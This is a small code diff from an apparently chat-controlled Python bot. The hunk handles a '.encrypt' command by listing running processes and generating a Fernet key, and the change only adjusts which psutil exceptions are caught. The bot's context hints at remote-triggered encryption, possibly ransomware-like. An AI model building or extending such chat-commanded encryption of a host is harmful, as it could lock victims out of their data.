@@ -23,7 +23,7 @@ elif message.content[:8] == '.encrypt':
             try:
                 if process.info['pid'] != current_pid:
                     running_processes.add(process.info['name'])
-            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+            except (psutil.NoSuchProcess, psutil.AccessDenied):
                 pass
 
         key = Fernet.generate_key()
